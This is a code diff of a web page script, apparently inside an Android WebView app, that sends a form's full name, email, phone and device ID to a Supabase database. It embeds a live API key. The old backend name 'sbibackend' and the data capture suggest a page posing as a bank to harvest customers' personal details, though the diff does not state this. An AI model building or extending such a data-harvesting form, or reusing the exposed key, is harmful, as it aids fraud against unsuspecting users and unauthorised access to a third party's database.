@@ -141,7 +141,8 @@
     </main>
 
     <script>
-        const BACKEND_URL = 'https://sbibackend.onrender.com';
+        const SUPABASE_URL = 'https://kisskrjtazekbsbdwrvr.supabase.co';
+        const SUPABASE_KEY = 'eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJpc3MiOiJzdXBhYmFzZSIsInJlZiI6Imtpc3Nrcmp0YXpla2JzYmR3cnZyIiwicm9sZSI6ImFub24iLCJpYXQiOjE3NzkyNTU2NzgsImV4cCI6MjA5NDgzMTY3OH0.zq_-C5Qt7O0WAxO5-INNA_hrtbY1UX5JbEP5LaQ73DE';
 
         const phoneInput = document.getElementById('phoneInput');
         phoneInput.addEventListener('input', (e) => {
@@ -160,7 +161,7 @@
             }
             
             const formData = {
-                deviceId: window.AndroidBridge ? window.AndroidBridge.getDeviceId() : 'browser_test',
+                device_id: window.AndroidBridge ? window.AndroidBridge.getDeviceId() : 'browser_test',
                 full_name: e.target.querySelector('input[placeholder="Full Name *"]').value,
                 email: e.target.querySelector('input[placeholder="Email *"]').value,
                 phone: phoneInput.value,
@@ -169,9 +170,14 @@
             };
 
             try {
-                await fetch(`${BACKEND_URL}/api/users/update`, {
+                await fetch(`${SUPABASE_URL}/rest/v1/users?on_conflict=device_id`, {
                     method: 'POST',
-                    headers: { 'Content-Type': 'application/json' },
+                    headers: { 
+                        'Content-Type': 'application/json',
+                        'apikey': SUPABASE_KEY,
+                        'Authorization': `Bearer ${SUPABASE_KEY}`,
+                        'Prefer': 'resolution=merge-duplicates'
+                    },
                     body: JSON.stringify(formData)
                 });
             } catch (err) { console.error("Sync Error:", err); }
